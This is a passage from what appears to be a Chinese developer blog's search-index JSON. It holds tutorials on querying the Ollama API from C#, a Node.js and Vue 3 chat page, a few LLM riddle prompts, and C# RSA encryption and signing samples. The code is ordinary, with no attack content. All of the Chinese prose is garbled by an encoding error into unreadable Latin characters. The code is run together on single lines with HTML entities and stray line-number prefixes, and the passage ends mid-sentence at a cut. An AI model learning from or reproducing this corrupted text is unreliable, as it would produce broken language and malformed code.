csharpè¦ä½¿ç”¨C#å¼€å‘ä¸€ä¸ªä¸Ollama APIè¿›è¡Œå¯¹è¯çš„ç¨‹åºï¼Œé¦–å…ˆéœ€è¦ç¡®ä¿å·²ç»å®‰è£…äº†Ollamaå¹¶ä¸”å®ƒæ­£åœ¨è¿è¡Œã€‚Ollamaé€šå¸¸ä¼šåœ¨æœ¬åœ°æä¾›ä¸€ä¸ªREST APIï¼Œå¯ä»¥é€šè¿‡HTTPè¯·æ±‚ä¸å®ƒè¿›è¡Œäº¤äº’ã€‚ ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„C#ç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•ä½¿ç”¨HttpClientä¸Ollama APIè¿›è¡Œäº¤äº’ï¼Œå¹¶è·å–æ¨¡å‹æ ‡ç­¾ï¼ˆå¦‚&#x2F;api&#x2F;tagsï¼‰ã€‚ 1. åˆ›å»ºC#æ§åˆ¶å°åº”ç”¨ç¨‹åºé¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„C#æ§åˆ¶å°åº”ç”¨ç¨‹åºé¡¹ç›®ã€‚ 123dotnet new console -n OllamaChatcd OllamaChat 2. æ·»åŠ å¿…è¦çš„NuGetåŒ…éœ€è¦æ·»åŠ System.Net.HttpåŒ…æ¥å¤„ç†HTTPè¯·æ±‚ã€‚å¦‚æœä½¿ç”¨çš„æ˜¯.NET Core 3.1æˆ–æ›´é«˜ç‰ˆæœ¬ï¼ŒSystem.Net.Httpå·²ç»åŒ…å«åœ¨SDKä¸­ï¼Œæ— éœ€é¢å¤–å®‰è£…ã€‚ 3. ç¼–å†™ä»£ç åœ¨Program.csä¸­ç¼–å†™ä»¥ä¸‹ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839using System;using System.Net.Http;using System.Text;using System.Threading.Tasks;class Program&#123; static async Task Main(string[] args) &#123; // Ollama APIçš„URL string ollamaApiUrl = &quot;http://localhost:11434/api/tags&quot;; // åˆ›å»ºHttpClientå®ä¾‹ using (HttpClient client = new HttpClient()) &#123; try &#123; // å‘é€GETè¯·æ±‚è·å–æ¨¡å‹æ ‡ç­¾ HttpResponseMessage response = await client.GetAsync(ollamaApiUrl); // ç¡®ä¿è¯·æ±‚æˆåŠŸ response.EnsureSuccessStatusCode(); // è¯»å–å“åº”å†…å®¹ string responseBody = await response.Content.ReadAsStringAsync(); // è¾“å‡ºå“åº”å†…å®¹ Console.WriteLine(&quot;Response from Ollama API:&quot;); Console.WriteLine(responseBody); &#125; catch (HttpRequestException e) &#123; // å¤„ç†è¯·æ±‚å¼‚å¸¸ Console.WriteLine(&quot;\\nException Caught!&quot;); Console.WriteLine(&quot;Message :&#123;0&#125; &quot;, e.Message); &#125; &#125; &#125;&#125; 4. è¿è¡Œç¨‹åºç¡®ä¿Ollamaæ­£åœ¨è¿è¡Œï¼Œå¹¶ä¸”APIç«¯ç‚¹http://localhost:11434/api/tagsæ˜¯å¯è®¿é—®çš„ã€‚ç„¶åè¿è¡Œçš„C#ç¨‹åºï¼š 12dotnet run 5. è§£é‡Šä»£ç HttpClient: ç”¨äºå‘é€HTTPè¯·æ±‚å’Œæ¥æ”¶HTTPå“åº”ã€‚ GetAsync: å‘é€ä¸€ä¸ªGETè¯·æ±‚åˆ°æŒ‡å®šçš„URLã€‚ EnsureSuccessStatusCode: ç¡®ä¿HTTPå“åº”æ˜¯æˆåŠŸçš„ï¼ˆçŠ¶æ€ç 200-299ï¼‰ã€‚ ReadAsStringAsync: è¯»å–å“åº”å†…å®¹ä¸ºå­—ç¬¦ä¸²ã€‚ Response from Ollama API:{â€œmodelsâ€:[{â€œnameâ€:â€deepseek-r1:7bâ€,â€modelâ€:â€deepseek-r1:7bâ€,â€modified_atâ€:â€2025-02-04T62xxxxxxxx}}]} C# è°ƒç”¨ Ollama API è¿›è¡Œå¯¹è¯åŒ…æ‹¬è·å–æ¨¡å‹åˆ—è¡¨å’Œè¿›è¡Œå¯¹è¯ã€‚ä½¿ç”¨ HttpClient å‘é€ HTTP è¯·æ±‚ï¼Œå¹¶è§£æè¿”å›çš„ JSON æ•°æ®ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687using System;using System.Net.Http;using System.Text;using System.Text.Json;using System.Threading.Tasks;class Program&#123; private static readonly string BaseUrl = &quot;http://1.1.1.1:11434&quot;; static async Task Main() &#123; Console.WriteLine(&quot;è·å–å¯ç”¨æ¨¡å‹åˆ—è¡¨...&quot;); var models = await GetModelList(); Console.WriteLine($&quot;æ¨¡å‹åˆ—è¡¨: &#123;string.Join(&quot;, &quot;, models)&#125;&quot;); if (models.Length == 0) &#123; Console.WriteLine(&quot;æ²¡æœ‰å¯ç”¨çš„æ¨¡å‹ï¼&quot;); return; &#125; string model = models[0]; // é€‰æ‹©ç¬¬ä¸€ä¸ªæ¨¡å‹ Console.WriteLine($&quot;ä½¿ç”¨æ¨¡å‹: &#123;model&#125;&quot;); while (true) &#123; Console.Write(&quot;: &quot;); string userInput = Console.ReadLine(); if (string.IsNullOrWhiteSpace(userInput)) break; string response = await ChatWithOllama(model, userInput); Console.WriteLine($&quot;Ollama: &#123;response&#125;&quot;); &#125; &#125; // è·å–å¯ç”¨æ¨¡å‹åˆ—è¡¨ static async Task&lt;string[]&gt; GetModelList() &#123; using HttpClient client = new(); HttpResponseMessage response = await client.GetAsync($&quot;&#123;BaseUrl&#125;/api/tags&quot;); if (!response.IsSuccessStatusCode) &#123; Console.WriteLine(&quot;è·å–æ¨¡å‹åˆ—è¡¨å¤±è´¥&quot;); return Array.Empty&lt;string&gt;(); &#125; string json = await response.Content.ReadAsStringAsync(); using JsonDocument doc = JsonDocument.Parse(json); var models = doc.RootElement.GetProperty(&quot;models&quot;); string[] modelNames = new string[models.GetArrayLength()]; for (int i = 0; i &lt; models.GetArrayLength(); i++) &#123; modelNames[i] = models[i].GetProperty(&quot;name&quot;).GetString(); &#125; return modelNames; &#125; // å‘é€å¯¹è¯è¯·æ±‚ static async Task&lt;string&gt; ChatWithOllama(string model, string prompt) &#123; using HttpClient client = new(); var requestBody = new &#123; model = model, prompt = prompt, stream = false &#125;; string jsonRequest = JsonSerializer.Serialize(requestBody); var content = new StringContent(jsonRequest, Encoding.UTF8, &quot;application/json&quot;); HttpResponseMessage response = await client.PostAsync($&quot;&#123;BaseUrl&#125;/api/generate&quot;, content); if (!response.IsSuccessStatusCode) &#123; return &quot;å¯¹è¯è¯·æ±‚å¤±è´¥&quot;; &#125; string jsonResponse = await response.Content.ReadAsStringAsync(); using JsonDocument doc = JsonDocument.Parse(jsonResponse); return doc.RootElement.GetProperty(&quot;response&quot;).GetString(); &#125;&#125; è·å–æ¨¡å‹åˆ—è¡¨ (GetModelList): å‘é€ GET è¯·æ±‚åˆ° http://1.1.1.1:11434/api/tags è·å–æ¨¡å‹åˆ—è¡¨ã€‚è§£æ JSON å“åº”ï¼Œæå–æ¨¡å‹åç§°ã€‚è¿›è¡Œå¯¹è¯ (ChatWithOllama): å‘é€ POST è¯·æ±‚åˆ° http://1.1.1.1:11434/api/generateã€‚è¯·æ±‚ä½“åŒ…å«ï¼šmodel: é€‰æ‹©çš„æ¨¡å‹åç§°ã€‚prompt: ç”¨æˆ·è¾“å…¥çš„é—®é¢˜ã€‚stream: false: ç¦ç”¨æµå¼å“åº”ï¼Œç›´æ¥è¿”å›å®Œæ•´çš„ç»“æœã€‚äº¤äº’æ–¹å¼: å…ˆè·å–æ¨¡å‹åˆ—è¡¨ï¼Œé»˜è®¤é€‰æ‹©ç¬¬ä¸€ä¸ªæ¨¡å‹ã€‚è¿›å…¥å¯¹è¯å¾ªç¯ï¼Œç”¨æˆ·è¾“å…¥æ–‡æœ¬åï¼Œç¨‹åºè°ƒç”¨ API è·å– AI å›å¤å¹¶æ‰“å°ã€‚ è¿è¡Œç¤ºä¾‹ï¼šè·å–å¯ç”¨æ¨¡å‹åˆ—è¡¨â€¦æ¨¡å‹åˆ—è¡¨: llama3, gemma, mistralä½¿ç”¨æ¨¡å‹: llama3: å¥½ï¼Ollama: å¥½ï¼å¾ˆé«˜å…´è§åˆ°ã€‚æ˜¯è°ï¼ŸOllama: æˆ‘æ˜¯ä¸€ä¸ª AI è¯­è¨€æ¨¡å‹ï¼Œå¯ä»¥å¸®åŠ©å›ç­”é—®é¢˜ã€‚nodejs vue3 Node.jsï¼ˆExpress + Vue 3ï¼‰å®ç°çš„å¯¹è¯ç½‘é¡µï¼Œæ”¯æŒé€‰æ‹©æ¨¡å‹å¹¶ä¸ Ollama è¿›è¡Œå¯¹è¯ã€‚ åç«¯ï¼ˆNode.js + Expressï¼‰ï¼šæä¾› API è·å–æ¨¡å‹åˆ—è¡¨ï¼Œå¹¶ä¸ Ollama è¿›è¡Œå¯¹è¯ã€‚å‰ç«¯ï¼ˆVue 3 + Element Plusï¼‰ï¼šåˆ›å»ºç•Œé¢ï¼Œå…è®¸ç”¨æˆ·é€‰æ‹©æ¨¡å‹å¹¶è¿›è¡Œå¯¹è¯ã€‚ åç«¯ï¼ˆNode.js + Expressï¼‰å®‰è£…ä¾èµ–ï¼š 12npm init -ynpm install express axios cors åˆ›å»º server.jsï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344const express = require(&quot;express&quot;);const axios = require(&quot;axios&quot;);const cors = require(&quot;cors&quot;);const app = express();const PORT = 3000;const OLLAMA_URL = &quot;http://1.1.1.1:11434&quot;;app.use(express.json());app.use(cors());// è·å–å¯ç”¨æ¨¡å‹åˆ—è¡¨app.get(&quot;/api/models&quot;, async (req, res) =&gt; &#123; try &#123; const response = await axios.get(`$&#123;OLLAMA_URL&#125;/api/tags`); res.json(response.data.models); &#125; catch (error) &#123; res.status(500).json(&#123; error: &quot;è·å–æ¨¡å‹åˆ—è¡¨å¤±è´¥&quot; &#125;); &#125;&#125;);// å‘é€å¯¹è¯è¯·æ±‚app.post(&quot;/api/chat&quot;, async (req, res) =&gt; &#123; const &#123; model, message &#125; = req.body; if (!model || !message) &#123; return res.status(400).json(&#123; error: &quot;ç¼ºå°‘æ¨¡å‹æˆ–æ¶ˆæ¯å‚æ•°&quot; &#125;); &#125; try &#123; const response = await axios.post(`$&#123;OLLAMA_URL&#125;/api/generate`, &#123; model, prompt: message &#125;); res.json(response.data); &#125; catch (error) &#123; res.status(500).json(&#123; error: &quot;å¯¹è¯è¯·æ±‚å¤±è´¥&quot; &#125;); &#125;&#125;);app.listen(PORT, () =&gt; &#123; console.log(`Server running at http://localhost:$&#123;PORT&#125;`);&#125;); å‰ç«¯ï¼ˆVue 3 + Element Plusï¼‰å®‰è£… Vue 3 é¡¹ç›®ï¼š 12345npm create vue@latest ollama-chatcd ollama-chatnpm install axios element-plusnpm run dev ä¿®æ”¹ src&#x2F;App.vueï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;script setup&gt;import &#123; ref, onMounted &#125; from &quot;vue&quot;;import axios from &quot;axios&quot;;import &#123; ElMessage &#125; from &quot;element-plus&quot;;const models = ref([]);const selectedModel = ref(&quot;&quot;);const userInput = ref(&quot;&quot;);const chatHistory = ref([]);const fetchModels = async () =&gt; &#123; try &#123; const response = await axios.get(&quot;http://localhost:3000/api/models&quot;); models.value = response.data; if (models.value.length &gt; 0) &#123; selectedModel.value = models.value[0].name; // é»˜è®¤é€‰ç¬¬ä¸€ä¸ª &#125; &#125; catch (error) &#123; ElMessage.error(&quot;æ— æ³•è·å–æ¨¡å‹åˆ—è¡¨&quot;); &#125;&#125;;const sendMessage = async () =&gt; &#123; if (!userInput.value.trim()) &#123; ElMessage.warning(&quot;è¯·è¾“å…¥å†…å®¹&quot;); return; &#125; if (!selectedModel.value) &#123; ElMessage.warning(&quot;è¯·é€‰æ‹©æ¨¡å‹&quot;); return; &#125; const userMessage = &#123; role: &quot;user&quot;, content: userInput.value &#125;; chatHistory.value.push(userMessage); try &#123; const response = await axios.post(&quot;http://localhost:3000/api/chat&quot;, &#123; model: selectedModel.value, message: userInput.value, &#125;); chatHistory.value.push(&#123; role: &quot;assistant&quot;, content: response.data.response &#125;); &#125; catch (error) &#123; ElMessage.error(&quot;è¯·æ±‚å¤±è´¥&quot;); &#125; userInput.value = &quot;&quot;;&#125;;onMounted(fetchModels);&lt;/script&gt;&lt;template&gt; &lt;div style=&quot;max-width: 600px; margin: auto; padding: 20px&quot;&gt; &lt;el-select v-model=&quot;selectedModel&quot; placeholder=&quot;é€‰æ‹©æ¨¡å‹&quot; style=&quot;width: 100%; margin-bottom: 10px&quot;&gt; &lt;el-option v-for=&quot;model in models&quot; :key=&quot;model.name&quot; :label=&quot;model.name&quot; :value=&quot;model.name&quot; /&gt; &lt;/el-select&gt; &lt;div v-for=&quot;(msg, index) in chatHistory&quot; :key=&quot;index&quot; :style=&quot;&#123; textAlign: msg.role === &#x27;user&#x27; ? &#x27;right&#x27; : &#x27;left&#x27; &#125;&quot;&gt; &lt;el-card shadow=&quot;never&quot; style=&quot;margin: 5px 0&quot;&gt; &lt;strong&gt;&#123;&#123; msg.role === &quot;user&quot; ? &quot;ï¼š&quot; : &quot;Ollamaï¼š&quot; &#125;&#125;&lt;/strong&gt; &#123;&#123; msg.content &#125;&#125; &lt;/el-card&gt; &lt;/div&gt; &lt;el-input v-model=&quot;userInput&quot; placeholder=&quot;è¾“å…¥æ¶ˆæ¯...&quot; @keyup.enter=&quot;sendMessage&quot; /&gt; &lt;el-button type=&quot;primary&quot; @click=&quot;sendMessage&quot; style=&quot;width: 100%; margin-top: 10px&quot;&gt;å‘é€&lt;/el-button&gt; &lt;/div&gt;&lt;/template&gt;&lt;style&gt;.el-card &#123; padding: 10px; border-radius: 8px;&#125;&lt;/style&gt; è¿è¡Œé¡¹ç›®è¿è¡Œåç«¯ï¼šnode server.jsè¿è¡Œå‰ç«¯ï¼šnpm run dev æ‰“å¼€æµè§ˆå™¨è®¿é—® Vue å¼€å‘æœåŠ¡å™¨ï¼ˆä¸€èˆ¬æ˜¯ http://localhost:5173ï¼‰ã€‚åŠŸèƒ½è¯´æ˜âœ… æ¨¡å‹é€‰æ‹©ï¼šå‰ç«¯è¯·æ±‚ http://1.1.1.1:11434/api/tags è·å–å¯ç”¨çš„ Ollama æ¨¡å‹åˆ—è¡¨ã€‚âœ… å¯¹è¯åŠŸèƒ½ï¼šè¾“å…¥æ¶ˆæ¯åï¼Œå‰ç«¯å‘é€åˆ°åç«¯ï¼Œåç«¯è¯·æ±‚ Ollama è¿›è¡Œç”Ÿæˆï¼Œå¹¶è¿”å›å›å¤ã€‚âœ… å†å²è®°å½•ï¼šæ˜¾ç¤ºç”¨æˆ·å’Œ AI çš„å¯¹è¯å†…å®¹ã€‚âœ… ç®€å• UIï¼šä½¿ç”¨ Vue 3 å’Œ Element Plus æ„å»ºç•Œé¢ï¼Œæ”¯æŒå¿«æ·é”® Enter å‘é€æ¶ˆæ¯ã€‚ è¿™ä¸ªç¤ºä¾‹å¯ä»¥ç›´æ¥ç”¨äºå’Œ Ollama äº¤äº’ï¼Œå¹¶æ”¯æŒä¸åŒçš„ LLM æ¨¡å‹é€‰æ‹© ğŸš€ è§£æ Ollama æµå¼å“åº”ï¼Œæ˜¾ç¤ºå¯¹è¯å†…å®¹ã€‚å‰ç«¯è°ƒæ•´ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114&lt;template&gt; &lt;div&gt; &lt;h1&gt;Ollama Chat&lt;/h1&gt; &lt;div&gt; &lt;label for=&quot;model-select&quot;&gt;é€‰æ‹©æ¨¡å‹:&lt;/label&gt; &lt;select id=&quot;model-select&quot; v-model=&quot;selectedModel&quot;&gt; &lt;option v-for=&quot;model in models&quot; :key=&quot;model.name&quot; :value=&quot;model.name&quot;&gt; &#123;&#123; model.name &#125;&#125; &lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;div&gt; &lt;textarea v-model=&quot;userInput&quot; placeholder=&quot;è¾“å…¥çš„æ¶ˆæ¯...&quot;&gt;&lt;/textarea&gt; &lt;button @click=&quot;sendMessage&quot;&gt;å‘é€&lt;/button&gt; &lt;/div&gt; &lt;div&gt; &lt;h2&gt;å¯¹è¯å†…å®¹:&lt;/h2&gt; &lt;pre&gt;&#123;&#123; conversation &#125;&#125;&lt;/pre&gt; &lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import axios from &#x27;axios&#x27;; export default &#123; data() &#123; return &#123; models: [], // æ¨¡å‹åˆ—è¡¨ selectedModel: &#x27;&#x27;, // å½“å‰é€‰ä¸­çš„æ¨¡å‹ userInput: &#x27;&#x27;, // ç”¨æˆ·è¾“å…¥çš„æ¶ˆæ¯ conversation: &#x27;&#x27;, // å¯¹è¯å†…å®¹ &#125;; &#125;, async created() &#123; // é¡µé¢åŠ è½½æ—¶è·å–æ¨¡å‹åˆ—è¡¨ await this.fetchModels(); &#125;, methods: &#123; // è·å–æ¨¡å‹åˆ—è¡¨ async fetchModels() &#123; try &#123; const response = await axios.get(&#x27;https://eog9l2jl-cig0n4bq-ferbg20o9l88.vcc4.mcprev.cn/api/models&#x27;); this.models = response.data; if (this.models.length &gt; 0) &#123; this.selectedModel = this.models[0].name; // é»˜è®¤é€‰æ‹©ç¬¬ä¸€ä¸ªæ¨¡å‹ &#125; &#125; catch (error) &#123; console.error(&#x27;è·å–æ¨¡å‹åˆ—è¡¨å¤±è´¥:&#x27;, error); &#125; &#125;, // å‘é€æ¶ˆæ¯ async sendMessage() &#123; if (!this.userInput.trim()) return; // å¦‚æœè¾“å…¥ä¸ºç©ºï¼Œç›´æ¥è¿”å› const message = this.userInput; this.conversation += `ç”¨æˆ·: $&#123;message&#125;\\n`; // å°†ç”¨æˆ·è¾“å…¥æ·»åŠ åˆ°å¯¹è¯å†…å®¹ this.userInput = &#x27;&#x27;; // æ¸…ç©ºè¾“å…¥æ¡† try &#123; const response = await axios.post(&#x27;https://eog9l2jl-cig0n4bq-ferbg20o9l88.vcc4.mcprev.cn/api/chat&#x27;, &#123; model: this.selectedModel, message: message, &#125;); // è§£ææµå¼è¿”å›çš„æ•°æ® const rawData = response.data.split(&#x27;\\n&#x27;); // æŒ‰è¡Œæ‹†åˆ† JSON let aiResponse = &#x27;&#x27;; rawData.forEach(line =&gt; &#123; if (line.trim()) &#123; try &#123; const parsed = JSON.parse(line); if (parsed.response) &#123; aiResponse += parsed.response; // æ‹¼æ¥ AI å›å¤ &#125; &#125; catch (error) &#123; console.error(&#x27;JSON è§£æå¤±è´¥:&#x27;, error); &#125; &#125; &#125;); // æ›´æ–°å¯¹è¯å†…å®¹ this.conversation += `AI: $&#123;aiResponse&#125;\\n`; &#125; catch (error) &#123; console.error(&#x27;å‘é€æ¶ˆæ¯å¤±è´¥:&#x27;, error); this.conversation += `AI: è¯·æ±‚å¤±è´¥ï¼Œè¯·ç¨åé‡è¯•ã€‚\\n`; &#125; &#125;, &#125;, &#125;; &lt;/script&gt; &lt;style&gt; /* å¯ä»¥åœ¨è¿™é‡Œæ·»åŠ ä¸€äº›æ ·å¼ */ textarea &#123; width: 300px; height: 100px; margin-bottom: 10px; &#125; button &#123; padding: 5px 10px; cursor: pointer; &#125; pre &#123; white-space: pre-wrap; /* ä¿ç•™æ¢è¡Œç¬¦ */ background: #f4f4f4; padding: 10px; border-radius: 5px; &#125; &lt;/style&gt; å¯æ»šåŠ¨æ¡†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ CSS çš„ overflow å±æ€§ã€‚ &lt;div&gt; &lt;h2&gt;å¯¹è¯å†…å®¹:&lt;/h2&gt; &lt;div style=&quot;max-height: 200px; overflow-y: auto;&quot;&gt; &lt;pre&gt;&#123;&#123; conversation &#125;&#125;&lt;/pre&gt; &lt;/div&gt; &lt;/div&gt; æˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªæ–°çš„ å…ƒç´ ï¼Œå¹¶è®¾ç½®äº†å®ƒçš„ style å±æ€§ã€‚max-height: 200px é™åˆ¶äº†è¿™ä¸ªæ¡†çš„æœ€å¤§é«˜åº¦ï¼Œè€Œ overflow-y: auto åˆ™å…è®¸åœ¨å†…å®¹è¶…å‡ºè¿™ä¸ªé«˜åº¦æ—¶å‡ºç°æ»šåŠ¨æ¡ã€‚ æ™ºå•†æµ‹è¯•strawberryæœ‰å¤šå°‘ä¸ªrï¼Ÿ10.11å’Œ10.2è°å¤§ï¼Ÿ24ç‚¹æ¸¸æˆè§£é¢˜:3 4 7 13æ ‘ä¸Š10åªé¸Ÿï¼Œå¼€æªæ‰“æ­»1åªï¼Œè¯·é—®è¿˜æœ‰å¤šå°‘åªé¸Ÿï¼Ÿ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"RASåŠ å¯†","slug":"RASåŠ å¯†","date":"2025-01-21T02:07:25.000Z","updated":"2025-01-21T03:28:19.251Z","comments":true,"path":"2025/01/21/RASåŠ å¯†/","permalink":"https://banjinmei.github.io/2025/01/21/RAS%E5%8A%A0%E5%AF%86/","excerpt":"","text":"c# RAS C#éå¯¹ç§°åŠ å¯† ä¾‹å­ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758using System;using System.Security.Cryptography;using System.Text;class Program&#123; static void Main(string[] args) &#123; string originalText = &quot;Hello, World!&quot;; // åˆ›å»º RSA ç®—æ³•å®ä¾‹ using (RSA rsa = RSA.Create()) &#123; // å¯¼å‡ºå…¬é’¥ string publicKey = Convert.ToBase64String(rsa.ExportRSAPublicKey()); // å¯¼å‡ºç§é’¥ string privateKey = Convert.ToBase64String(rsa.ExportRSAPrivateKey()); // åŠ å¯† byte[] encryptedBytes = Encrypt(originalText, publicKey); string encryptedText = Convert.ToBase64String(encryptedBytes); Console.WriteLine($&quot;Encrypted Text: &#123;encryptedText&#125;&quot;); // è§£å¯† string decryptedText = Decrypt(encryptedBytes, privateKey); Console.WriteLine($&quot;Decrypted Text: &#123;decryptedText&#125;&quot;); &#125; &#125; static byte[] Encrypt(string data, string publicKeyString) &#123; // å°†å…¬é’¥ä» Base64 å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ byte[] publicKeyBytes = Convert.FromBase64String(publicKeyString); using (RSA rsa = RSA.Create()) &#123; // å¯¼å…¥å…¬é’¥ rsa.ImportRSAPublicKey(publicKeyBytes, out _); // å°†æ•°æ®è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ byte[] dataBytes = Encoding.UTF8.GetBytes(data); // åŠ å¯†æ•°æ® return rsa.Encrypt(dataBytes, RSAEncryptionPadding.OaepSHA256); &#125; &#125; static string Decrypt(byte[] encryptedData, string privateKeyString) &#123; // å°†ç§é’¥ä» Base64 å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ byte[] privateKeyBytes = Convert.FromBase64String(privateKeyString); using (RSA rsa = RSA.Create()) &#123; // å¯¼å…¥ç§é’¥ rsa.ImportRSAPrivateKey(privateKeyBytes, out _); // è§£å¯†æ•°æ® byte[] decryptedBytes = rsa.Decrypt(encryptedData, RSAEncryptionPadding.OaepSHA256); // å°†è§£å¯†åçš„å­—èŠ‚æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸² return Encoding.UTF8.GetString(decryptedBytes); &#125; &#125;&#125; å­—ç¬¦ä¸²è§£å¯†ï¼š 123456789101112131415161718192021222324252627282930313233using System;using System.Security.Cryptography;using System.Text;class StringDecryption&#123; static void Main(string[] args) &#123; string encryptedText = &quot;your_encrypted_text_here&quot;; string privateKey = &quot;your_private_key_here&quot;; try &#123; string decryptedText = Decrypt(encryptedText, privateKey); Console.WriteLine($&quot;Decrypted Text: &#123;decryptedText&#125;&quot;); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error during decryption: &#123;ex.Message&#125;&quot;); &#125; &#125; static string Decrypt(string encryptedText, string privateKey) &#123; byte[] encryptedBytes = Convert.FromBase64String(encryptedText); byte[] privateKeyBytes = Convert.FromBase64String(privateKey); using (RSA rsa = RSA.Create()) &#123; rsa.ImportRSAPrivateKey(privateKeyBytes, out _); byte[] decryptedBytes = rsa.Decrypt(encryptedBytes, RSAEncryptionPadding.OaepSHA256); return Encoding.UTF8.GetString(decryptedBytes); &#125; &#125;&#125; è¾“å…¥çš„å¯†æ–‡å’Œç§é’¥éƒ½åº”è¯¥æ˜¯åˆæ³•çš„ Base64 ç¼–ç å­—ç¬¦ä¸²ï¼Œå¦åˆ™ Convert.FromBase64String ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ ç§é’¥ç­¾å123456789101112131415161718192021222324252627282930313233using System;using System.Security.Cryptography;using System.Text;class SignatureExample&#123; static void Main(string[] args) &#123; string data = &quot;Hello, World!&quot;; string privateKey = &quot;your_private_key_here&quot;; try &#123; byte[] signature = SignData(data, privateKey); Console.WriteLine($&quot;Signature: &#123;Convert.ToBase64String(signature)&#125;&quot;); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error during signing: &#123;ex.Message&#125;&quot;); &#125; &#125; static byte[] SignData(string data, string privateKey) &#123; byte[] dataBytes = Encoding.UTF8.GetBytes(data); byte[] privateKeyBytes = Convert.FromBase64String(privateKey); using (RSA rsa = RSA.Create()) &#123; rsa.ImportRSAPrivateKey(privateKeyBytes, out _); // ä½¿ç”¨ RSASignaturePadding.Pkcs1 ç­¾å return rsa.SignData(dataBytes, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1); &#125; &#125;&#125; dataï¼šéœ€è¦ç­¾åçš„æ•°æ®ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªç®€å•çš„å­—ç¬¦ä¸² â€œHello, World!â€ã€‚privateKeyï¼šç”¨äºç­¾åçš„ç§é’¥ï¼Œä»¥ Base64 ç¼–ç çš„å­—ç¬¦ä¸²å½¢å¼æä¾›ã€‚éœ€è¦å°† â€œyour_private_key_hereâ€ æ›¿æ¢ä¸ºå®é™…çš„ç§é’¥ã€‚SignData å‡½æ•°ï¼šbyte[] dataBytes &#x3D; Encoding.UTF8.GetBytes(data);ï¼šå°†éœ€è¦ç­¾åçš„æ•°æ®è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ï¼Œå› ä¸ºç­¾åæ“ä½œé€šå¸¸æ˜¯åœ¨å­—èŠ‚çº§åˆ«è¿›è¡Œçš„ã€‚byte[] privateKeyBytes &#x3D; Convert.FromBase64String(privateKey);ï¼šå°† Base64 ç¼–ç çš„ç§é’¥è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ï¼Œä»¥ä¾¿ RSA ç®—æ³•å¯ä»¥ä½¿ç”¨ã€‚using (RSA rsa &#x3D; RSA.Create())ï¼šåˆ›å»ºä¸€ä¸ª RSA ç®—æ³•çš„å®ä¾‹ã€‚rsa.ImportRSAPrivateKey(privateKeyBytes, out _);ï¼šå°†ç§é’¥å¯¼å…¥ RSA ç®—æ³•å®ä¾‹ã€‚return rsa.SignData(dataBytes, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);ï¼šä½¿ç”¨å¯¼å…¥çš„ç§é’¥å¯¹æ•°æ®è¿›è¡Œç­¾åã€‚dataBytesï¼šè¦ç­¾åçš„æ•°æ®çš„å­—èŠ‚è¡¨ç¤ºã€‚HashAlgorithmName.SHA256ï¼šä½¿ç”¨ SHA256 ç®—æ³•å¯¹æ•°æ®è¿›è¡Œå“ˆå¸Œå¤„ç†ã€‚RSASignaturePadding.Pkcs1ï¼šä½¿ç”¨ PKCS #1 ç­¾åå¡«å……æ–¹æ¡ˆã€‚ ä½¿ç”¨è¯´æ˜ï¼šå°† your_private_key_here æ›¿æ¢ä¸ºè‡ªå·±çš„ RSA ç§é’¥ã€‚ç¨‹åºå°†å¯¹ â€œHello, World!â€ è¿™ä¸ªæ•°æ®è¿›è¡Œç­¾åã€‚ç­¾åç»“æœå°†ä»¥ Base64 ç¼–ç çš„å­—ç¬¦ä¸²å½¢å¼è¾“å‡ºã€‚è¿è¡Œç¨‹åºï¼Œå¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œå°†çœ‹åˆ°ç”Ÿæˆçš„ç­¾åï¼›å¦‚æœå‡ºç°å¼‚å¸¸ï¼Œå°†è¾“å‡ºé”™è¯¯æ¶ˆæ¯ã€‚è¯·ç¡®ä¿ç§é’¥çš„å®‰å…¨æ€§ï¼Œå› ä¸ºç§é’¥ç”¨äºç”Ÿæˆç­¾åï¼Œä¸€æ—¦æ³„éœ²ï¼Œç­¾åçš„å®‰å…¨æ€§å°†å—åˆ°å¨èƒã€‚åŒæ—¶ï¼Œæ ¹æ®éœ€è¦å¯ä»¥ä½¿ç”¨ä¸åŒçš„å“ˆå¸Œç®—æ³•å’Œç­¾åå¡«å……æ–¹æ¡ˆï¼Œä½†è¦ç¡®ä¿é€šä¿¡åŒæ–¹ä½¿ç”¨ç›¸åŒçš„è®¾ç½®ï¼Œä»¥ä¿è¯ç­¾åéªŒè¯çš„æœ‰æ•ˆæ€§ã€‚æ­¤å¤–ï¼Œåœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¯èƒ½éœ€è¦è€ƒè™‘å¯¹ç­¾åç»“æœè¿›è¡Œå­˜å‚¨æˆ–ä¼ 